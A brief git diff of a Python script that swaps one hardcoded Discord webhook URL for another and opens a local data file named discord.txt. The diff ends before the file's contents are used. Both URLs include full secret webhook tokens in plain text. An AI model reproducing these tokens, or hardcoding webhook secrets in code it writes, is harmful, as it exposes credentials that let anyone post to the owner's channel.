@@ -1,7 +1,7 @@
 import requests
 import os
 
-webhookUrl = "https://discord.com/api/webhooks/1259557473891913778/yRpa6KmItdG-tPr7wprC-SJCKVKehF4wjOyJb369zmk5CU12RZ4HMcQZMtDgMfY0Jslo"
+webhookUrl = "https://discord.com/api/webhooks/1258986608711962685/S5xGk84f__B9NVHEeYaP779XCc-wgsOLFv4jPm7dek33kGH1Mwa9RTK43fwoTrEfVqts"
 file_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../data/discord.txt'))
 
 with open(file_path, 'r') as file:
